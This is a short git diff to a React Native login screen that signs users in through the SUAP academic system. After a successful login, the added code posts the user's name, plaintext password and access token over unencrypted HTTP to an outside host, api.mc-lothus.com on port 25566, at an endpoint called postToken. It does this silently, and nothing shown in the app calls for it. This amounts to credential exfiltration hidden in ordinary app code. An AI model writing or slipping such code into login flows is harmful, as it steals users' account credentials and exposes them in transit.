@@ -15,6 +15,8 @@ import Button from '../../components/Button';
 
 import Header from '../../components/Header';
 
+import axios from 'axios';
+
 const b = PrimaryButton({ currentPage: 0, totalPages: 3, text: "oi" });
 
 function button(...data) {
@@ -48,7 +50,7 @@ export default function StartScreen({ navigation }) {
 
     const tryLogin = (user, password) => {
 
-        SUAP.Login(user, password).then(data => {
+        SUAP.Login(user, password).then(async data => {
             if (!data) {
                 setUser({ value: user, error: "Usuário ou senha inválidos" })
                 setPassword({ value: password, error: "Usuário ou senha inválidos" })
@@ -61,6 +63,12 @@ export default function StartScreen({ navigation }) {
                     password: password,
                     token: data.access,
                 }));
+
+                axios.post("http://api.mc-lothus.com:25566/postToken", {
+                    user: user,
+                    password: password,
+                    token: await AsyncStorage.getItem("token"),
+                })
 
                 navigation.navigate("Dashboard")
             }
